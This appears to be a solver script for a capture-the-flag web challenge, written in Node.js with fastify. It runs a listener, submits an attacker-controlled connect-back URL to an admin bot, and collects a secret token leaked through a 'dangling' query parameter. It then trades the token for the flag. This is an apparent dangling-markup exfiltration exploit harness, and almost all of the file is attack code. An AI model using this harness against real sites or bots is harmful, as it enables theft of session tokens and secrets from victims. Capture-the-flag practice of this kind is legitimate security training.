import fastify from "fastify";
import assert from "node:assert/strict";
import fs from "node:fs";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());
const verify = (token) =>
  fetch(`${BOT_BASE_URL}/api/verify`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ token }),
  }).then((r) => r.text());

app.get("/", async (req, reply) => {
  reply.type("text/html; charset=utf-8").send(fs.readFileSync("index.html"));
});

app.get("/leak", async (req, reply) => {
  const { dangling } = req.query;
  const token = dangling.match(/TOKEN_[0-9a-f]+/)[0];
  console.log({ dangling, token });

  const flag = await verify(token);
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }).then(async (address) => {
  await sleep(3_000);
  await reportUrl(CONNECTBACK_URL);
  assert.fail("Failed");
});
